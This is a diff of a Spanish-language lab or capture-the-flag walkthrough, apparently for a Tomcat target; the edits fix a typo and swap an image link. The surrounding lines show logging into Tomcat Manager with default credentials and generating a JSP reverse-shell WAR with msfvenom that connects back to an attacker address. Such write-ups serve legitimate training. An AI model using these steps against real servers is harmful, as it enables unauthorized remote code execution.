@@ -18,7 +18,7 @@ intentamos con las credenciales
 
 > las credenciales: tomcat/s3cr3t
 
-entramos al "magaer app" con esas credenciales
+entramos al "manager app" con esas credenciales
 
 encontramos la parte de WAR file to deploy, donde se suben archivos .war
 
@@ -27,7 +27,9 @@ encontramos la parte de WAR file to deploy, donde se suben archivos .war
 para poder tener una conexión RCE utilizamos: msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war
 
 lo lanzamos y nos crea un:   revshell.war
-![[generado.png]]
+
+![image](https://github.com/user-attachments/assets/973132b0-0212-4472-9b61-d4f0c763c3eb)
+
 
 lo subimos en archivos "WAR" y luego lo cargamos
 
